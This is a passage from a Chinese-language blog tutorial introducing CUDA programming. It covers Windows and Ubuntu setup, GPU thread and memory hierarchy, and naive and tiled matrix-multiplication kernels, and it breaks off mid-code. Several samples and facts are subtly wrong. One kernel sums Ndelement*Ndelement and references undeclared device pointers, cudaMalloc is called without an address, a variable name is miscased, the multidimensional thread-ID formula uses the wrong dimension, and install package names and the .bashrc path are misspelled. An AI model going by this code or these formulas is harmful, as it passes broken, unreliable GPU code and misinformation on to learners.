<h2 id="BOOST"><a href="#BOOST" class="headerlink" title="BOOST"></a>BOOST</h2><h2 id="QT"><a href="#QT" class="headerlink" title="QT"></a>QT</h2><h2 id="OpenCV"><a href="#OpenCV" class="headerlink" title="OpenCV"></a>OpenCV</h2>]]></content>
      <categories>
        <category>C/C++</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>CUDA 入门</title>
    <url>/2020/02/14/C/CUDA/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>


<h2 id="CUDA"><a href="#CUDA" class="headerlink" title="CUDA"></a>CUDA</h2><p>参考书：</p>
<ul>
<li>CUDA C Programming Guide</li>
<li>CUDA Best Practice Guide</li>
</ul>
<p>社区：<br><a href="http://developer.nvidia.com/category/zone/cuda-zone">Cuda-zone</a></p>
<h2 id="CUDA-基础"><a href="#CUDA-基础" class="headerlink" title="CUDA 基础"></a>CUDA 基础</h2><h3 id="CPU-计算"><a href="#CPU-计算" class="headerlink" title="CPU 计算"></a>CPU 计算</h3><p>现代CPU技术和架构都已经有了性能上的优化：流水线技术，分支预测，超标量，乱序执行，存储器层次，矢量操作，多核处理等。CPU内部包含多个核心，共享三级缓存，访存控制，外设接口等。</p>
<h3 id="并行计算"><a href="#并行计算" class="headerlink" title="并行计算"></a>并行计算</h3><p>并行计算的编程模型有：</p>
<ul>
<li>共享存储模型</li>
<li>线程模型</li>
<li>消息传递模型</li>
<li>数据并行模型</li>
</ul>
<h3 id="GPU-开发环境搭建"><a href="#GPU-开发环境搭建" class="headerlink" title="GPU 开发环境搭建"></a>GPU 开发环境搭建</h3><h4 id="Windows-安装"><a href="#Windows-安装" class="headerlink" title="Windows 安装"></a>Windows 安装</h4><p>安装Visual Stuido与CUDA，搞深度学习还可以再安装CUDNN。</p>
<p><a href="https://visualstudio.microsoft.com/zh-hans/?rr=https://cn.bing.com/">Visual Stuido 2019</a></p>
<p><a href="https://developer.nvidia.com/cuda-downloads?target_os=Windows&target_arch=x86_64&target_version=10&target_type=exelocal">CUDA</a></p>
<p><a href="https://developer.nvidia.com/cudnn">cuDNN</a>（需要登录）</p>
<p>安装完成后，打开Visual Studio，新建项目，选择NVIDIA的CUDA项目，选择CUDA Runtime，输入项目名称，确定创建。</p>
<p>CUDA代码以<code>.cu</code>为后缀。创建完成后，软件自动打开kernel.cu文件。这是一个示例文件，可以在此基础上进行开发。按下<code>Ctrl+F5</code>编译运行程序。运行成功表名安装成功。</p>
<p>另外，CUDA会提供CUDA Samples，可以参考使用。</p>
<p>如果找不到<code>cublas64_100.dll</code>，可以去<code>C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\bin</code>下把下面的文件修改为所缺文件即可。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cublas64_10.dll</span><br><span class="line">cusolver64_10.dll</span><br><span class="line">cudart64_101.dll</span><br></pre></td></tr></table></figure>

<h4 id="Ubuntu-安装"><a href="#Ubuntu-安装" class="headerlink" title="Ubuntu 安装"></a>Ubuntu 安装</h4><p>查看系统相关信息：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看系统版本</span></span><br><span class="line"><span class="built_in">cat</span> /etc/issue</span><br><span class="line"><span class="comment"># 查看显卡</span></span><br><span class="line">lspci | grep -i nvidia</span><br><span class="line"><span class="comment"># Linux发行版本</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># 查看gcc</span></span><br><span class="line">gcc -v</span><br></pre></td></tr></table></figure>

<p>下载<a href="https://developer.nvidia.com/cuda-downloads">CUDA</a>。</p>
<p>安装支持库：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-get install freeglut3-dev build-essential libxll-dev libxmu-dev libxi-dev libgll-mesa-glx libglul-mesa-dev</span><br></pre></td></tr></table></figure>

<p>卸载旧的NVIDIA驱动：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo nvidia-uninstall</span><br></pre></td></tr></table></figure>

<p>清除相关的库：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-get --purge remove nvidia-*</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/modprobe.d/</span><br><span class="line">vim nvidia-installer-disable-nouveau.conf</span><br></pre></td></tr></table></figure>

<p>文件内容是：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">blacklist nouveau</span><br><span class="line">options nouveau modeset=0</span><br></pre></td></tr></table></figure>

<p>关闭窗口管理器</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">service lightdm stop</span><br></pre></td></tr></table></figure>

<p>重启电脑。</p>
<p>安装CUDA：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo sh cuda_*.run </span><br><span class="line"><span class="comment"># 安装过程配置选项</span></span><br><span class="line"><span class="comment"># 是否接受EULA：accept</span></span><br><span class="line"><span class="comment"># 是否安装图形加速驱动：yes</span></span><br><span class="line"><span class="comment"># 是否安装CUDA：yes</span></span><br><span class="line"><span class="comment"># 是否安装CUDA样例代码：yes</span></span><br><span class="line"><span class="comment"># CUDA样例代码路径：回车，保持默认</span></span><br></pre></td></tr></table></figure>

<p>配置环境变量：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim ~/.bash.rc</span><br><span class="line">source ~/.bash.rc</span><br></pre></td></tr></table></figure>

<p>.bash.rc内容为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export CUDA=/usr/local/cuda-9.2</span><br><span class="line">export PATH=$CUDA/bin:$PATH</span><br><span class="line">export LD_LIBRARY_PATH=/usr/lib:$CUDA/lib64:$CUDA/lib:/lib:$LD_LIBRARY_PATH</span><br></pre></td></tr></table></figure>

<p>查看版本信息：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nvcc --version</span><br></pre></td></tr></table></figure>

<p>编译样例代码：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> NVIDIA*_Samples</span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<p>运行样例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> bin/x86_64/linux/release/</span><br><span class="line">./vectorAddDrv</span><br></pre></td></tr></table></figure>


<h3 id="GPU-体系架构"><a href="#GPU-体系架构" class="headerlink" title="GPU 体系架构"></a>GPU 体系架构</h3><h4 id="处理器资源"><a href="#处理器资源" class="headerlink" title="处理器资源"></a>处理器资源</h4><p>thread：是CUDA中的最小单位，由一个CUDA Core执行。一个CUDA Core包含一个ALU，相应的register和local memory。</p>
<p>warp：以32个thread组成的一个单元。warp中所有线程并行的执行相同的指令。</p>
<p>block：由若干thread组成，以及一块shared memory，硬件上则是由一块SM（Streaming Multiprocessors）执行。需要注意的是，大部分thread只是逻辑上并行，并不是所有的thread可以在物理上同时执行。这就导致，同一个block中的线程可能会有不同步调。</p>
<p>grid：由若干个block构成，除此之外还包含global memory，texture memory等。一个grid由一个设备负责运行。</p>
<p>kernel：是在GPU上执行的一个程序。一个kernel启动一个grid，包含了若干线程块，这个数量可以由用户定义。每一个线程和线程块都有唯一的标识。</p>
<h4 id="存储器资源"><a href="#存储器资源" class="headerlink" title="存储器资源"></a>存储器资源</h4><p>GPU的存储包括：<br>Register：片内，由thread私有。<br>Shared Memory：片内，属于block拥有。<br>Local Memory：片外，由thread私有。<br>Global Memory：片外，每个grid公用。<br>Constant Memory：片外。<br>Texture Memory：片外，对于主机可写，对于设备只读。<br>Instruction Memory：片外，不可见的。</p>
<p>CPU与GPU有各自的存储空间，二者通过PCI-E总线连接。因此在编程过程中，所有的数据必须预先传输给GPU，产生的结果也得通过总线取回。</p>
<h3 id="编程模型"><a href="#编程模型" class="headerlink" title="编程模型"></a>编程模型</h3><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p>在编程中，如果要将变量和函数放入GPU中执行，需要修饰关键字修饰相关的变量和函数。</p>
<p>函数声明：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 执行位置：设备，调用位置：设备</span></span><br><span class="line"><span class="function">__device__ <span class="type">float</span> <span class="title">DeviceFunc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="comment">// 执行位置：设备，调用位置：主机</span></span></span><br><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">KernelFunc</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"><span class="comment">// 执行位置：主机，调用位置：主机</span></span></span><br><span class="line"><span class="function">__host__ <span class="type">float</span> <span class="title">HostFunc</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>

<p>其中<code>__global__</code>函数必须返回<code>void</code>，<code>__device__</code>与<code>__host__</code>可以同时使用。</p>
<p>由<code>__global__</code>修饰的函数又叫核函数（Kernels），调用核函数需要指定占用的线程数。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">VecAdd</span><span class="params">(<span class="type">float</span> *A, <span class="type">float</span> *B, <span class="type">float</span> *C)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i = threadIdx.x;</span><br><span class="line">    C[i] = A[i] + B[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> A[<span class="number">100</span>], B[<span class="number">100</span>], C[<span class="number">100</span>];</span><br><span class="line">    <span class="comment">// 1个Block，每个Block含32个Threads</span></span><br><span class="line">    VecAdd&lt;&lt;&lt;<span class="number">1</span>, <span class="number">32</span>&gt;&gt;&gt;(A, B, C);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在GPU上编写程序与在CPU上编写不同，在GPU上：</p>
<ul>
<li>不鼓励使用递归，因为其堆栈很小；</li>
<li>不要使用静态变量；</li>
<li>少用malloc，因为众多线程都去malloc，量就会很大；</li>
<li>小心指针，尤其是函数指针。</li>
</ul>
<p>Block可以使用一维，二维或三维方式访问Thread。</p>
<p>每一个线程都有一个编号：Thread Index。<br>对于一维Block，有：<br>Thread ID &#x3D;&#x3D; Thread Index；<br>对于二维Block(Dx, Dy)，有：<br>Thread ID of index(x, y) &#x3D;&#x3D; x + y * Dy；<br>对于三维Block(Dx, Dy, Dz)，有：<br>Thread ID of index(x, y, z) &#x3D;&#x3D; x + y * Dy + z * Dx * Dy</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">MatAdd</span><span class="params">(<span class="type">float</span> A[N][N], <span class="type">float</span> B[N][N], <span class="type">float</span> C[N][N])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// threadIdx -&gt; Thread Index</span></span><br><span class="line">    <span class="type">int</span> i = threadIdx.x;</span><br><span class="line">    <span class="type">int</span> j = threadIdx.y;</span><br><span class="line">    C[i][j] = A[i][j] + B[i][j];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> numBlocks = <span class="number">1</span>;</span><br><span class="line">    <span class="function">dim3 <span class="title">threadsPerBlock</span><span class="params">(N, N)</span></span>;</span><br><span class="line">    <span class="comment">// 1个Block，每个Block含 N * N 个Threads</span></span><br><span class="line">    MatAdd&lt;&lt;&lt;numBlocks, threadsPerblock&gt;&gt;&gt;(A, B, C);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意：最大线程数在不同的显卡中是不一样的，具体要看显卡的相关资料。如图所示，该显卡每个线程块最大含有1024个线程。</p>
<img src="/2020/02/14/C/CUDA/cuda_info.jpg" class="" title="显卡信息">

<p>Grid可以用一维或多维的方式访问Block。</p>
<p>每一个块都有一个块索引：blockIdx。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">MatAdd</span><span class="params">(<span class="type">float</span> A[N][N], <span class="type">float</span> B[N][N], <span class="type">float</span> C[N][N])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// threadIdx -&gt; Thread Index</span></span><br><span class="line">    <span class="comment">// blockDim -&gt; Block Dimension</span></span><br><span class="line">    <span class="comment">// blockIdx -&gt; Block Index</span></span><br><span class="line">    <span class="type">int</span> i = blockIdx.x * blockDim.x + threadIdx.x;</span><br><span class="line">    <span class="type">int</span> j = blockIdx.y * blockDim.y + threadIdx.y;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; N &amp;&amp; j &lt; N)&#123;</span><br><span class="line">        C[i][j] = A[i][j] + B[i][j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">dim3 <span class="title">threadsPerBlock</span><span class="params">(<span class="number">16</span>, <span class="number">16</span>)</span></span>;</span><br><span class="line">    <span class="function">dim3 <span class="title">numBlocks</span><span class="params">(N / threadsPerBlock.x, N / threadsPerBlock.y)</span></span>;</span><br><span class="line">    MatAdd&lt;&lt;&lt;numBlocks, threadsPerblock&gt;&gt;&gt;(A, B, C);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>例如，设N&#x3D;32，那么Grid里面有2x2个Block：<br>blockIdx([0, 1], [0, 1])<br>blockDim &#x3D; 16<br>threadIdx([0, 15], [0, 15])<br>i &#x3D; [0, 1] * 16 + [0, 15]</p>
<h4 id="访存"><a href="#访存" class="headerlink" title="访存"></a>访存</h4><p>对于访存，不同的模型可以访问的内存区域也不同，读写属性也不同。</p>
<p>Register：由threads私有且可读可写，速度快，容量小。<br>Shared Memory：由block内的所有threads共享，且可读可写。<br>Local Memory：由threads私有且可读可写。<br>Global Memory：由grid内所有threads共享，可读可写；对于Host而言，也可读可写。<br>Constant Memory：由grid内所有threads共享，只可读；对于Host而言，可读可写。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在设备端分配global memory</span></span><br><span class="line"><span class="built_in">cudaMalloc</span>()</span><br><span class="line"><span class="comment">// 释放存储空间</span></span><br><span class="line"><span class="built_in">cudaFree</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 例如：</span></span><br><span class="line"><span class="type">float</span> *Md;</span><br><span class="line"><span class="type">int</span> size = Width * Width * <span class="built_in">sizeof</span>(<span class="type">float</span>);</span><br><span class="line"><span class="comment">// 这里的Md是设备端的指针，不能在主机端使用</span></span><br><span class="line"><span class="built_in">cudaMalloc</span>((<span class="type">void</span>**)&amp;Md, size);</span><br><span class="line"><span class="built_in">cudaFree</span>(Md);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 内存传输</span></span><br><span class="line"><span class="built_in">cudaMemcpy</span>(dest, src, size, direction);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 例如：</span></span><br><span class="line"><span class="built_in">cudaMemcpy</span>(Md, M, size, cudaMemcpyHostToDevice);</span><br><span class="line"><span class="built_in">cudaMemcpy</span>(P, Pd, size, cudaMemcpyDeviceToHost);</span><br></pre></td></tr></table></figure>

<h4 id="方阵相乘示例-1"><a href="#方阵相乘示例-1" class="headerlink" title="方阵相乘示例 1"></a>方阵相乘示例 1</h4><p>步骤：</p>
<ol>
<li>分配内存，拷贝数据；</li>
<li>并行计算；</li>
<li>拷贝结果，释放内存。</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">MatrixMulKernel</span><span class="params">(<span class="type">float</span> *M, <span class="type">float</span> *N, <span class="type">float</span> *P, <span class="type">int</span> Width)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 获取当前计算的点 P(tx, ty)</span></span><br><span class="line">    <span class="type">int</span> tx = threadIdx.x;</span><br><span class="line">    <span class="type">int</span> ty = threadIdx.y;</span><br><span class="line"></span><br><span class="line">    <span class="type">float</span> Pvalue = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 矩阵相乘</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; Width; k++)&#123;</span><br><span class="line">        <span class="comment">// 这里使用一维数组存储二维矩阵</span></span><br><span class="line">        <span class="type">float</span> Mdelement = Md[ty * Md.width + k];  </span><br><span class="line">        <span class="type">float</span> Ndelement = Nd[k * Nd.width + tx];</span><br><span class="line">        Pvalue += Ndelement * Ndelement;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 写回数据</span></span><br><span class="line">    Pd[ty * Width + tx] = Pvalue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MatrixMulOnDevice</span><span class="params">(<span class="type">float</span> *M, <span class="type">float</span> *N, <span class="type">float</span> *P, <span class="type">int</span> Width)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> size = Width * Width * <span class="built_in">sizeof</span>(<span class="type">float</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分配内存，拷贝数据</span></span><br><span class="line">    <span class="built_in">cudaMalloc</span>(Md, size);</span><br><span class="line">    <span class="built_in">cudaMemcpy</span>(Md, M, size, cudaMemcpyHostToDevice);</span><br><span class="line">    <span class="built_in">cudaMalloc</span>(Nd, size);</span><br><span class="line">    <span class="built_in">cudaMemcpy</span>(Nd, N, size, cudaMemcpyHostToDevice);</span><br><span class="line">    <span class="built_in">cudaMalloc</span>(Pd, size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 并行计算 Width * Width 个线程</span></span><br><span class="line">    <span class="function">dim3 <span class="title">dimBlock</span><span class="params">(Width, Width)</span></span>;</span><br><span class="line">    <span class="function">dim3 <span class="title">dimGrid</span><span class="params">(<span class="number">1</span>, <span class="number">1</span>)</span></span>;</span><br><span class="line">    MatrixMulKernel&lt;&lt;&lt;dimGrid, dimBlock&gt;&gt;&gt;(Md, Nd, P, Width);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 拷贝结果，释放内存</span></span><br><span class="line">    <span class="built_in">cudaMemcpy</span>(P, Pd, size, cudaMemcpyDeviceToHost);</span><br><span class="line">    <span class="built_in">cudaFree</span>(Md);</span><br><span class="line">    <span class="built_in">cudaFree</span>(Nd);</span><br><span class="line">    <span class="built_in">cudaFree</span>(Pd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是这样的方式也有局限。首先是访存的频率和计算频率接近 1:1 ，而访存的时间又比较长，因此限制了性能。其次是每个Block限制了最大线程数，我们无法计算大型的矩阵乘法。</p>
<h4 id="数据类型与操作"><a href="#数据类型与操作" class="headerlink" title="数据类型与操作"></a>数据类型与操作</h4><p>在GPU上支持向量数据类型，主要有：</p>
<ul>
<li>char[1-4]</li>
<li>uchar[1-4]</li>
<li>short[1-4]</li>
<li>ushort[1-4]</li>
<li>int[1-4]</li>
<li>uint[1-4]</li>
<li>long[1-4]</li>
<li>ulong[1-4]</li>
<li>longlong[1-4]</li>
<li>ulonglong[1-4]</li>
<li>float[1-4]</li>
<li>double1</li>
<li>double2</li>
</ul>
<p>他们同时适用于host和device，可以通过<code>make_&lt;typename&gt;</code>构造。例如</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">int2 i = <span class="built_in">make_int2</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">float4 f = <span class="built_in">make_float4</span>(<span class="number">1.0f</span>, <span class="number">2.0f</span>, <span class="number">3.0f</span>, <span class="number">4.0f</span>);</span><br></pre></td></tr></table></figure>

<p>引用可以使用属性<code>.x</code>，<code>.y</code>，<code>.z</code>，<code>.w</code>的方式引用：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">int2 i = <span class="built_in">make_int2</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line"><span class="type">int</span> x = i.x;</span><br><span class="line"><span class="type">int</span> y = i.y;</span><br></pre></td></tr></table></figure>

<p>此外还有一些常用的数学函数：</p>
<ul>
<li>sqrt</li>
<li>rsqrt</li>
<li>exp</li>
<li>log</li>
<li>sin</li>
<li>cos</li>
<li>tan</li>
<li>sincos</li>
<li>asin</li>
<li>acos</li>
<li>atan2</li>
<li>trunc</li>
<li>ceil</li>
<li>floor</li>
<li>等</li>
</ul>
<p>如果是在设备端，可以在对应函数前使用双下划线，如：<code>__sin(x)</code>，它的速度更快，但是精度较低。</p>
<h4 id="块内线程同步"><a href="#块内线程同步" class="headerlink" title="块内线程同步"></a>块内线程同步</h4><p>由于一个块内部的线程并不一定是同步的，有时又需要在特定的地方需要同步操作，因此可以使用同步函数。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">__syncthreads();</span><br></pre></td></tr></table></figure>

<p>该函数会等待所有线程完成任务再继续执行，但是同步也会造成死锁，编写代码的时候需要注意。</p>
<h4 id="Wrap-线程束与线程调度"><a href="#Wrap-线程束与线程调度" class="headerlink" title="Wrap 线程束与线程调度"></a>Wrap 线程束与线程调度</h4><p>GPU执行程序时，是按照wrap为单位执行，一个wrap是32个线程。每一个wrap保证同一时刻下面的线程执行相同的指令（SIMD模式）。但是block下并不是只有32个线程，而是更多。因此一个block可以包含多个wrap，且wrap之间的程序不一定是同步的，而且甚至是一个wrap在执行，另外一个wrap在等待调度。</p>
<p>如果一个wrap下不同线程要经过不同的分支，又要保证同一时刻执行相同的指令，就要使用线程屏蔽技术。该技术使这32个线程在遇到分支结构时，例如程序进入分支1，那么就会屏蔽分支2的线程；等分支1执行完毕后，再屏蔽分支1，启动分支2的线程执行。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 如果32个线程中既有满足分支1条件的线程，也有满足分支2条件的线程，那么就会按顺序，先执行分支1，再执行分支2，对于不满足条件的分支给予屏蔽。</span></span><br><span class="line"><span class="keyword">if</span> (condition)&#123;</span><br><span class="line">    <span class="comment">// 分支 1</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">// 分支 2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于一些老式显卡也有特殊情况。尽管调度是按照wrap为单位，但是承接调度的设备是一个SM。如果一个SM只能运行8个线程，那么此次调度的线程就要分4批进入SM，也就是32个线程就不会同步执行。对于现代显卡，一个SM基本上至少可以运行100多个线程。</p>
<h3 id="内存模型"><a href="#内存模型" class="headerlink" title="内存模型"></a>内存模型</h3><p>延时隐藏技术：在处理器处理程序时，处理的过程是很快的，但是当要进行访存等较慢且需要等待的操作，处理器就会停滞。为了让处理器“忙”起来，我们就会给处理器指派其他可以做的工作，直到前一次访存成功，再回去继续执行。</p>
<p>例如，有N个wrap，每个wrap访存一次需要16个周期，访存后停滞一段时间，每次访存只能有一个wrap。如果我们需要覆盖200个周期，那么需要的wrap数为：<code>200 / 16 = 13</code>个，才能掩藏延时。</p>
<p>另外，决定每个SM能够承载多少线程，是内部资源的分配决定的。</p>
<p>例如，每个SM含有8K个寄存器，当有768个线程需要分配时，每个线程可以分配<code>8K / 768 = 10</code>个寄存器。</p>
<p>再如，如果每个线程如果使用11个寄存器，那么这个SM就承载不了768个线程了。这样就会闲置CPU Core。</p>
<p>Local Memory是每个线程私有，但是存储在GPU的外存中。</p>
<p>Shared Memory是每个Block拥有，存储在GPU片内。它跟寄存器一样，也是决定SM能够承载多少线程的因素。</p>
<p>Global Memory可供全局使用，但是访问延时很长。</p>
<p>Constant Memory也可供全局使用，延时短，带宽高，容量有64KB，但是对于GPU只读。</p>
<p>声明内存可以使用：</p>
<table>
<thead>
<tr>
<th>声明</th>
<th>存储器</th>
<th>作用域</th>
<th>声明周期</th>
</tr>
</thead>
<tbody><tr>
<td>单独的auto变量（非数组）</td>
<td>register</td>
<td>thread</td>
<td>kernel</td>
</tr>
<tr>
<td>auto变量数组</td>
<td>local</td>
<td>thread</td>
<td>kernel</td>
</tr>
<tr>
<td><code>__shared__ int</code></td>
<td>shared</td>
<td>block</td>
<td>kernel</td>
</tr>
<tr>
<td><code>__device__ int</code></td>
<td>global</td>
<td>grid</td>
<td>application</td>
</tr>
<tr>
<td><code>__constant__ int</code></td>
<td>constant</td>
<td>grid</td>
<td>application</td>
</tr>
</tbody></table>
<p>Host可以通过如下的函数访问global和constant变量：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cudaGetSymbolAddress</span>()</span><br><span class="line"><span class="built_in">cudaGetSymbolSize</span>()</span><br><span class="line"><span class="built_in">cudaMemcpyToSymbol</span>()</span><br><span class="line"><span class="built_in">cudaMemcpyFromSymbol</span>()</span><br></pre></td></tr></table></figure>

<p>另外，constant变量必须在函数外声明。</p>
<h4 id="方阵相乘示例-2"><a href="#方阵相乘示例-2" class="headerlink" title="方阵相乘示例 2"></a>方阵相乘示例 2</h4><p>上一次的方阵相乘问题：</p>
<ul>
<li>仅使用一个block，线程数并不多，导致处理问题的规模受限制；</li>
<li>有很多的global memory访存活动，占用较多的时间。</li>
</ul>
<p>解决方案：</p>
<ol>
<li>去除问题规模的限制：将结果矩阵拆分成小块，把一个小块布置到一个block中。</li>
<li>减少global memory访存：将需要的数据按小块读入shared memory。</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 假设 1 个block最大包含16 * 16 = 256个线程</span></span><br><span class="line"><span class="comment">// 且shared memory足够使用</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TILE_WIDTH  16</span></span><br><span class="line"></span><br><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">MatrixMulKernel</span><span class="params">(<span class="type">float</span> *M, <span class="type">float</span> *N, <span class="type">float</span> *P, <span class="type">int</span> Width)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 创建shared memory</span></span><br><span class="line">    __shared__ <span class="type">float</span> Mds[TILE_WIDTH][TILE_WIDTH];</span><br><span class="line">    __shared__ <span class="type">float</span> Nds[TILE_WIDTH][TILE_WIDTH];</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> bx = blockIdx.x;</span><br><span class="line">    <span class="type">int</span> by = blockIdx.y;</span><br><span class="line">    <span class="type">int</span> tx = threadIdx.x;</span><br><span class="line">    <span class="type">int</span> ty = threadIdx.y;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取当前计算的点 P(Row, Col)</span></span><br><span class="line">    <span class="type">int</span> Row = by * TILE_WIDTH + ty;</span><br><span class="line">    <span class="type">int</span> Col = bx * TILE_WIDTH + tx;</span><br><span class="line"></span><br><span class="line">    <span class="type">float</span> Pvalue = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 矩阵相乘</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; Width/TILE_WIDTH; k++)&#123;</span><br><span class="line">        <span class="comment">// 将数据从global memory读入shared memory</span></span><br><span class="line">        Mds[ty][tx] = Md[Row * Width + (k * TILE_WIDTH + tx)]</span><br><span class="line">        Nds[ty][tx] = Nd[Col + (k * TILE_WIDTH + ty) * Width]</span><br><span class="line">        __syncthreads();</span><br><span class="line">        <span class="comment">// 当 Width/TILE_WIDTH 个小块全部读入数据到shared memory后，计算</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> m = <span class="number">0</span>; m &lt; TILE_WIDTH; m++)&#123;</span><br><span class="line">            Pvalue += Mds[ty][m] * Nds[m][tx];</span><br><span class="line">        &#125;</span><br><span class="line">        __syncthreads();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 写回数据</span></span><br><span class="line">    Pd[Row * Width + Col] = Pvalue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MatrixMulOnDevice</span><span class="params">(<span class="type">float</span> *M, <span class="type">float</span> *N, <span class="type">float</span> *P, <span class="type">int</span> Width)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> size = Width * Width * <span class="built_in">sizeof</span>(<span class="type">float</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分配内存，拷贝数据</span></span><br><span class="line">    <span class="built_in">cudaMalloc</span>(Md, size);</span><br><span class="line">    <span class="built_in">cudaMemcpy</span>(Md, M, size, cudaMemcpyHostToDevice);</span><br><span class="line">    <span class="built_in">cudaMalloc</span>(Nd, size);</span><br><span class="line">    <span class="built_in">cudaMemcpy</span>(Nd, N, size, cudaMemcpyHostToDevice);</span><br><span class="line">    <span class="built_in">cudaMalloc</span>(Pd, size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 并行计算 Width * Width 个线程</span></span><br><span class="line">    <span class="function">dim3 <span class="title">dimBlock</span><span class="params">(TILE_WIDTH, TILE_WIDTH)</span></span>;</span><br><span class="line">    <span class="function">dim3 <span class="title">dimGrid</span><span class="params">(Width / TILE_WIDTH, Width / TILE_WIDTH)</span></span>;</span><br><span class="line">    MatrixMulKernel&lt;&lt;&lt;dimGrid, dimBlock&gt;&gt;&gt;(Md, 